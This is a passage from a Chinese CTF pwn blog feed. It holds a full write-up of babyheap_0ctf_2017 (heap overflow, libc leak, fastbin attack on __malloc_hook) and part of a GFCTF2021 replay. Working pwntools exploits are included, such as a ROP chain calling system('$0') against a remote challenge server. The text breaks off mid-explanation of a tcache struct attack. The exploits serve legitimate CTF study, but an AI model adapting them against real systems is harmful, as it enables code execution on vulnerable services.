p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi) + \</span><br><span class="line">    p64(libc_bss)+p64(pop_rdx)+p64(<span class="number">0x40</span>)+p64(read_addr)</span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi) + \</span><br><span class="line">    p64(libc_bss)+p64(pop_rdx)+p64(<span class="number">0x40</span>)+p64(write_addr)</span><br><span class="line">payload += <span class="string">b&#x27;flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;总结一下:经过GFCTF的摧残打算复现一场较为简单的比赛了，虽然较为简单，但是也会有新东西学到哦。&lt;/p&gt;
&lt;h2 id=&quot;simpleHeap&quot;&gt;&lt;a href=&quot;#simpleHeap&quot; class=&quot;headerlink&quot; title=&quot;simpleHeap&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="比赛复现" scheme="https://cv196082.gitee.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>babyheap_0ctf_2017</title>
    <link href="https://cv196082.gitee.io/2022/01/14/babyheap-0ctf-2017/"/>
    <id>https://cv196082.gitee.io/2022/01/14/babyheap-0ctf-2017/</id>
    <published>2022-01-14T06:32:55.000Z</published>
    <updated>2022-01-14T06:42:46.644Z</updated>
    
    <content type="html"><![CDATA[<p>突然之间发现自己的博客好像还没发过有关fastbin attack的内容，今天抽时间写了一篇</p><h3 id="检测保护"><a href="#检测保护" class="headerlink" title="检测保护"></a>检测保护</h3><p><img src="/images/image-20220114141419120.png" alt="image-20220114141419120"></p><p>保护全开。</p><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>是一个很常规的菜单题。在create函数内部使用的calloc的生成chunk，区别就是会清理生成chunk的内部值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_D48</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(<span class="number">24LL</span> * i + a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      v2 = sub_138C();</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )</span><br><span class="line">          v2 = <span class="number">4096</span>;</span><br><span class="line">        v3 = <span class="built_in">calloc</span>(v2, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v3 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        *(_DWORD *)(<span class="number">24LL</span> * i + a1) = <span class="number">1</span>;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">8</span>) = v2;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">16</span>) = v3;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocate Index %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>edit函数就只是判断了chunk是否存在，你写入的内容大小并没有判断，可以造成堆溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_E7F</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(<span class="number">24LL</span> * (<span class="keyword">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      result = sub_138C();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">        result = sub_11B2(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete函数可以看到不存在UAF。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_F50</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(<span class="number">24LL</span> * (<span class="keyword">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(<span class="number">24LL</span> * v2 + a1) = <span class="number">0</span>;</span><br><span class="line">      *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>) = <span class="number">0LL</span>;</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>));</span><br><span class="line">      result = <span class="number">24LL</span> * v2 + a1;</span><br><span class="line">      *(_QWORD *)(result + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常的show函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_1051</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_DWORD *)(<span class="number">24LL</span> * result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      sub_130F(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>));</span><br><span class="line">      result = <span class="built_in">puts</span>(byte_14F1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>因为前几天才做了off by one所以这道题的第一反应就是修改chunk的size，覆盖掉后面的就好做了。</p><p>首先创建六个chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x10</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x50</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x50</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x60</span>)  <span class="comment"># 3</span></span><br><span class="line">create(<span class="number">0x60</span>)  <span class="comment"># 4</span></span><br><span class="line">create(<span class="number">0x10</span>)  <span class="comment"># 5</span></span><br></pre></td></tr></table></figure><p>然后通过chunk1修改chunk2的size，然后free掉chunk2，那么chunk2此时进入的就是unsorted bin了。</p><p><img src="/images/image-20220114142208412.png" alt="image-20220114142208412"></p><p>然后又create大小为0x50的chunk那么此时就会切割unsorted bin当中的chunk</p><p><img src="/images/image-20220114142346826.png" alt="image-20220114142346826"></p><p>此时的main_arena+88也就跑到了chunk3的位置，又因为没有delete掉chunk3所以直接可以泄漏main_arena，然后就是常规拿到__malloc_hook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">3</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">main_arena_88 = u64(r.recv(<span class="number">9</span>)[<span class="number">1</span>:])</span><br><span class="line">info(<span class="built_in">hex</span>(main_arena_88))</span><br><span class="line">malloc_hook = (main_arena_88 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc_base = malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base+<span class="number">0x4526a</span></span><br></pre></td></tr></table></figure><p>下面就开始用fastbin attack了</p><h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><p>其实这个攻击方式跟tcache的很类似，不过tcache在2.27就是裸奔fastbin还要检测一下size位。</p><p><img src="/images/image-20220114144043197.png" alt="image-20220114144043197"></p><p>这里有个满足条件的。</p><p>然后就是把chunk弄过来，然后覆盖掉__malloc_hook就好了</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyheap_0ctf_2017&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;babyheap_0ctf_2017&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;node4.buuoj.cn&#x27;, 28943)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>, size, data</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x50</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x50</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x60</span>)  <span class="comment"># 3</span></span><br><span class="line">create(<span class="number">0x60</span>)  <span class="comment"># 4</span></span><br><span class="line">create(<span class="number">0x10</span>)  <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>+p64(<span class="number">0x60</span>)+p64(<span class="number">0x140</span>+<span class="number">1</span>))</span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>+p64(<span class="number">0x140</span>)+p64(<span class="number">0x20</span>+<span class="number">1</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x50</span>)  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">main_arena_88 = u64(r.recv(<span class="number">9</span>)[<span class="number">1</span>:])</span><br><span class="line">info(<span class="built_in">hex</span>(main_arena_88))</span><br><span class="line">malloc_hook = (main_arena_88 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc_base = malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base+<span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>)  <span class="comment"># 6</span></span><br><span class="line">create(<span class="number">0x60</span>)  <span class="comment"># 7</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>)  <span class="comment"># 3</span></span><br><span class="line">edit(<span class="number">3</span>, <span class="number">0x9</span>, p64(malloc_hook-<span class="number">0x20</span>+<span class="number">5</span>-<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>)  <span class="comment"># 6</span></span><br><span class="line">create(<span class="number">0x60</span>)  <span class="comment"># 7</span></span><br><span class="line">create(<span class="number">0x60</span>)  <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">5</span>-<span class="number">8</span>)+p64(one_gadget)</span><br><span class="line">info(<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">edit(<span class="number">8</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">create(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;突然之间发现自己的博客好像还没发过有关fastbin attack的内容，今天抽时间写了一篇&lt;/p&gt;
&lt;h3 id=&quot;检测保护&quot;&gt;&lt;a href=&quot;#检测保护&quot; class=&quot;headerlink&quot; title=&quot;检测保护&quot;&gt;&lt;/a&gt;检测保护&lt;/h3&gt;&lt;p&gt;&lt;img src</summary>
      
    
    
    
    <category term="pwn-buuctf" scheme="https://cv196082.gitee.io/categories/pwn-buuctf/"/>
    
    
    <category term="fastbin attack" scheme="https://cv196082.gitee.io/tags/fastbin-attack/"/>
    
  </entry>
  
  <entry>
    <title>GFCTF2021复现</title>
    <link href="https://cv196082.gitee.io/2022/01/11/GFCTF/"/>
    <id>https://cv196082.gitee.io/2022/01/11/GFCTF/</id>
    <published>2022-01-11T10:55:31.000Z</published>
    <updated>2022-02-10T07:43:31.897Z</updated>
    
    <content type="html"><![CDATA[<p>深刻感觉到了这场比赛的难度，要是参加了的话我可能第一道题都完成不了。这次只复现了前面两道，因为第三题考得更多的是代码审计能力吧。</p><h1 id="shell"><a href="#shell" class="headerlink" title="shell"></a><strong>shell</strong></h1><p>题目保护只开了nx，主函数也是很简单的栈溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo &#x27;zltt lost his shell, can you find it?&#x27;&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是问题是题目没有泄漏函数。所以这里存在一个冷知识</p><p><img src="/images/image-20220111150232606.png" alt="image-20220111150232606"></p><p>system(“$0”)同样可以拿到shell</p><p><img src="/images/image-20220111150356286.png" alt="image-20220111150356286"></p><p>在ida发现tip函数存在</p><p><img src="/images/image-20220111150431403.png" alt="image-20220111150431403"></p><p>text段可以即可拿到shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./shell&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./shell&#x27;)</span></span><br><span class="line">r = remote(<span class="string">b&#x27;1.14.71.254&#x27;</span>, <span class="number">28087</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x00000000004005e3</span></span><br><span class="line">shell_addr = <span class="number">0x400541</span></span><br><span class="line">ret = <span class="number">0x0000000000400416</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)+p64(pop_rdi)+p64(shell_addr) + \</span><br><span class="line">    p64(<span class="number">0x0000000000400416</span>)+p64(system)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="look-face-no-patch"><a href="#look-face-no-patch" class="headerlink" title="look_face_no_patch"></a><strong>look_face_no_patch</strong></h1><p>所需知识点：tcache struct attack,_IO_FILE leak</p><p>这个题目有点绕，不过先把知识点掌握了就好。</p><h2 id="tcache-struct-attack"><a href="#tcache-struct-attack" class="headerlink" title="tcache struct attack"></a>tcache struct attack</h2><p>我这里主要是我自己总结可能阐述不是特别清楚所以看不懂的话可以看<a class="link"   href="https://xz.aliyun.com/t/6828" >https://xz.aliyun.com/t/6828<i class="fas fa-external-link-alt"></i></a> 这篇文章。</p><p>字面意思也就是攻击tcache结构体。</p><p>在做长安战役的比赛的off by one那道题目时我就在想，为什么我malloc一个chunk的时候要多出来一个0x250大小的chunk呢，现在知道这个chunk就是tcache的结构体。</p><p>和unsortedbin里面存的main_arena不同的是tcache的结构体就直接放在heap段的第一个。</p><p><img src="/images/image-20220111151306312.png" alt="image-20220111151306312"></p><p>可以看到上面的0x251大小的就是tcache结构体，再执行到free然后观察其内部结构。</p><p>(因为刚刚的0x80不具有演示效果我改了一下)</p><p><img src="/images/image-20220111151720296.png" alt="image-20220111151720296"></p><p>可以看见在tcache struct中heap_base+0x10–&gt;heap_base+0x50之间是存放的counts，而heap_base+0x50–&gt;heap_base+0x250之间存放的这是tcache_entry指针。</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>首先利用double free</p><p><img src="/images/image-20220111153652180.png" alt="image-20220111153652180"></p><p>此时chunk的fd指针指向的是他本身，而我们已知的tcache struct是在heap_base的位置所以只需要修改后面三位为010(这里是因为tcache_entry指向的是和malloc返回的指针只想同一个位置也就是heap_addr+0x10)所以我们只需要爆破第四位即可，那我们成功的概率也就是1/16。当我们爆破成功之后我们此时malloc两次chunk我们就可以得到tcache的结构体，将前面的内容全部填充为0xff即可绕过tcache，让后面free的chunk进入unsorted bin。</p><h2 id="IO-FILE-leak"><a href="#IO-FILE-leak" class="headerlink" title="_IO_FILE leak"></a>_IO_FILE leak</h2><p>在我的这一篇博客提到过_IO_FILE write <a href="https://cv196082.gitee.io/2021/12/06/echo-back/">https://cv196082.gitee.io/2021/12/06/echo-back/</a> 